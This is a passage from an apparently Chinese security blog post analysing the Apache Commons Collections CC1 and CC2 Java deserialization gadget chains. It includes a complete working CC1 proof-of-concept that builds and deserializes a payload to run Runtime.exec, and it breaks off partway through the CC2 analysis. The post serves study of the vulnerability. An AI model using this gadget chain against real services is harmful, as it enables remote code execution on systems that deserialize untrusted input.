<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">Object Runtime = java.lang.Runtime.class;</span><br><span class="line">Class s2mple = Runtime.getClass();</span><br><span class="line">Method s3mple = s2mple.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">Object aass = s3mple.invoke(Runtime,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;);</span><br><span class="line"> System.out.println(<span class="string">&quot;aass=&quot;</span>+aass);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">相当于执行了java.lang.Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就成功拿到了getRuntime方法；接着就是执行此方法拿到Runtime对象；继续传入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">//此时；input已经变成了一个方法类型；</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传入getClass之后得到Method；然后就可调用Method下的一些方法；追溯Method类invoke方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException,</span></span><br><span class="line"><span class="function">       InvocationTargetException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!override) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;</span><br><span class="line">            Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">            checkAccess(caller, clazz, obj, modifiers);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MethodAccessor ma = methodAccessor;             <span class="comment">// read volatile</span></span><br><span class="line">    <span class="keyword">if</span> (ma == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ma = acquireMethodAccessor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ma.invoke(obj, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现其参数为任意对象类型，第二个为多参数；即传数组；这里其实原理也是先通过InvokerTransformer下的getMethod拿到invoke函数，然后再invoke去调用invoke函数；可以继续续写上述的demo；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">Object Runtime = java.lang.Runtime.class;</span><br><span class="line">Class s2mple = Runtime.getClass();</span><br><span class="line">Method s3mple = s2mple.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">Object aass = s3mple.invoke(Runtime,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;);</span><br><span class="line"> System.out.println(<span class="string">&quot;aass=&quot;</span>+aass);</span><br><span class="line">     </span><br><span class="line">Class s4mple = aass.getClass();</span><br><span class="line">     Method s5mple = s4mple.getMethod(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;);</span><br><span class="line">   Object tt =   s5mple.invoke(aass,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">     System.out.println(tt);<span class="comment">//即可拿到实例化的Runtime类对象；</span></span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到了对象然后就可按照常规的思路去进行invoke其下的exec方法，然后达到rce；即在此传入；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后这里直接按照常规的getMethod方法的传参方法去进行传入即可；最后达到弹出个计算器的效果；</p>
<p>上面的一段分析清楚了，接下来就是去考虑怎么承接的问题；怎么去触发ChainedTransformer下的transform方法；回到最开始的LazyMap类下；发现有个get方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以调用factory属性下的transfrom方法；factory是什么；追溯下发现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以是一个Transformer的类型的变量；所以可以通过构造方法和ChainedTransformer相连；但是仅仅相连还是不够的，我们应该考虑如何去触发下面的get方法；</p>
<p>这里有个新的类去要利用；AnnotationInvocationHandler类；如下图：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cM7i4g"><img src="https://z3.ax1x.com/2021/04/05/cM7i4g.png" alt="cM7i4g.png"></a></p>
<p>AnnotationInvocationHandler类中有个构造函数，我们看到在构造函数中存在一个Map类型的memberValues变量；接着往下追溯看到有一行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object result = memberValues.get(member);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是调用了memberValues属性下的get方法；这里我们就可和之前的类进行衔接；而且注意到这个类是继承了Serializable接口的，是可以进行序列化的；我们只需要在构造函数处直接传入LazyMap就可；但是现在因为要想调用到上述的语句，就需要执行invoke方法；我们之前只是在构造函数中传入了我们需要的点，并不能直接执行，其执行是在invoke方法中；那么现在的问题就是如何去调用invoke方法；</p>
<h2 id="代理类触发invoke"><a href="#代理类触发invoke" class="headerlink" title="代理类触发invoke"></a>代理类触发invoke</h2><p>先来看AnnotationInvocationHandler类，它继承了InvocationHandler接口；该接口可以用来实现JDK的代理；JDK代理的主要函数为 ，Proxy.newProxyInstance；追溯下函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      InvocationHandler h)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>追溯其类定义，发现其继承了Serializable接口，是可以序列化的；所以我们可以通过向该函数传递ClassLoader，interfaces，和重写invoke方法的InvocationHandler实现类即可实现代理。JDK代理是基于接口的，因为在本身在实现的时候是继承实现的，由于继承是单继承所以只能依靠接口。代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。同时我们可以看到在invoke函数中有个敏感方法的调用；在上述已经说过；⬆️；所以思路已经很清晰了；</p>
<h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>先来写生成代理类的方法；这里有个小点需要注意的是；AnnotationInvocationHandler类的构造方法是default限定符；在同包下可见；所以这里如果我们想调用，还得需要通过反射来进行变限定；这里为了逻辑清晰，我们首先编写transformers下的部分点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span> &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"> Transformer s1mple = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实原理也很清楚了；上述也已经讲过，其实也就是通过另类的方法去调用到了getMethod invoke这些方法，去实现任意类下的函数调用；验证方法：将上述代码再次调用transform即可弹出计算器；</p>
<p>为了上述的代码，现在的问题就是如何去调用transform方法；分析lazymap方法；即从get方法下手，这里因为LazyMap类下的构造器的限定问题，所以方法有二，直接拿到构造函数利用反射进行变限定，或者直接调用decorate方法即可；这里我采用的是方法一：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashmap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">String mm = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">Class kk = Class.forName(mm);</span><br><span class="line">Constructor method = kk.getDeclaredConstructor(Map.class,Transformer.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object  lazymap = method.newInstance(hashmap,s1mple);</span><br><span class="line">Class jc = lazymap.getClass();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为形参的要求，第一个参数必须是Map类型的参数，所以这里选择HashMap；因为其继承Map接口；即可满足；第二个为Transformer类型的参数，因为ChainedTransformer也是继承Transformer接口，所以直接传入，然后在下面就可顺利的调用到ChainedTransformer下的transform方法；现在就是如何调用get方法；</p>
<p>这里链的原作者找到了AnnotationInvocationHandler类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在其invoke方法中，发现了可以调用任意类下的get方法；所以直接拿来用；可以将memberValues赋值为LazyMap的实力化对象，然后即可直接调用其get方法；那么现在的问题是如何去调用invoke方法；这里不得不佩服原作者的代码功底；继续看AnnotationInvocationHandler类中的readObject方法；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/c1Zm1e"><img src="https://z3.ax1x.com/2021/04/06/c1Zm1e.png" alt="c1Zm1e.png"></a></p>
<p>发现里面存在entrySet方法；我们只需要触发这个点就可；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String handler = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">Class inhandler = Class.forName(handler);</span><br><span class="line"> Constructor&lt;?&gt; constructor = inhandler.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line"> constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"> InvocationHandler AnnotationInvocationHandlerdx = (InvocationHandler) constructor.newInstance(Deprecated.class,lazymap);<span class="comment">//拿到实例化类；</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这我们先拿到AnnotationInvocationHandler的实例化对象；因为AnnotationInvocationHandler构造器限定符的原因，这里我们采用另外写法利用反射拿到构造器，然后执行构造器代码即可；触发invoke方法这里原作者是利用代理去触发invoke方法；先看其接口InvocationHandler，该接口是可以实现JDK代理；JDK代理的主要函数为 ，Proxy.newProxyInstance；</p>
<p>将InvocationHandler的实力化对象作为代理的第二个参数传进去，然后代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。所以我们可以将memberValues设置为代理类；然后在readObject的时候进行调用entrySet方法；这时因为代理的原因，就会调用我们原对象也就是AnnotationInvocationHandler下的invoke方法；这时再将memberValues赋值为lazymap的对象，也就自然的调用了get方法，到此整个链成；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.util.SerializationUtils.serialize;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">              <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span> &#125;),</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line">       Transformer s1mple = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap hashmap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">       String mm = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">       Class kk = Class.forName(mm);</span><br><span class="line">       Constructor method = kk.getDeclaredConstructor(Map.class,Transformer.class);</span><br><span class="line">       method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object  lazymap = method.newInstance(hashmap,s1mple);</span><br><span class="line"></span><br><span class="line">       String handler = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">       Class inhandler = Class.forName(handler);</span><br><span class="line">        Constructor&lt;?&gt; constructor = inhandler.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler AnnotationInvocationHandlerdx = (InvocationHandler) constructor.newInstance(Deprecated.class,lazymap);<span class="comment">//拿到实例化类；</span></span><br><span class="line">        Class cla = Deprecated.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;cla=&quot;</span>+cla);</span><br><span class="line"></span><br><span class="line">       Map evilMap = (Map) Proxy.newProxyInstance(</span><br><span class="line">               hashmap.getClass().getClassLoader(),</span><br><span class="line">               hashmap.getClass().getInterfaces(),</span><br><span class="line">               AnnotationInvocationHandlerdx</span><br><span class="line">       );</span><br><span class="line">       Constructor&lt;?&gt; ctor = Class.forName(handler).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">       ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       InvocationHandler ahandler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);</span><br><span class="line">       ObjectOutputStream asdf = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">       asdf.writeObject(ahandler);</span><br><span class="line">       ObjectInputStream sdf = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">       sdf.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这篇文章写了有点时间，中间有些间断，可能连贯性不是很好，但也算是一点研究的心得吧；</p>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前我们分析了CC1的链，其调用并不是很复杂，唯一需要理解的点也就是利用for循环去进行任意类下任意方法的任意执行，我们在那个点去变相的调用到Runtime下的构造器；或者直接拿到另外返回构造器到函数然后直接invoke；还有也就是java的代理机制，在代理下执行encrySet函数的时候，会调用原类对象下的invoke方法；用着两个跳板去进行类的串联，从而最后执行Runtime类下的exec方法，导致任意命令执行；</p>
<p>其实CC2链最后的执行点和CC1的执行点是一样的，只是我们中途的利用方法不同，这次是通过Javassist在Java字节码中插入命令执行代码然后通过ClassLoader加载修改好的字节码。从而达到任意命令执行；链条很简单，主要是通过链条学习javassist的用法；</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>我们先来看ysoserial的调用栈：简单分析下链条：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">            ...</span></span><br><span class="line"><span class="comment">               TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">                  InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                     Method.invoke()</span></span><br><span class="line"><span class="comment">                        Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>复现的起点还是在PriorityQueue.readObject()方法；追溯一下：</p>
<h2 id="优先级队列-PriorityQueue"><a href="#优先级队列-PriorityQueue" class="headerlink" title="优先级队列 PriorityQueue"></a>优先级队列 PriorityQueue</h2><p><code>PriorityQueue</code>一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，放入<code>PriorityQueue</code>的元素，必须实现<code>Comparable</code>接口，<code>PriorityQueue</code>会根据元素的排序顺序决定出队的优先级；或者根据构造队列时提供的<code>Comparator</code>进行排序，元素就不必实现<code>Comparable</code>接口，具体取决于所使用的构造方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以显然的看到进入readObject之后，首先去调用了默认的反序列化方法； <code> s.defaultReadObject();</code></p>
<p>然后进入排序方法heapify；继续追溯下相应的方法；这里将需要追溯的方法写到一起；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span 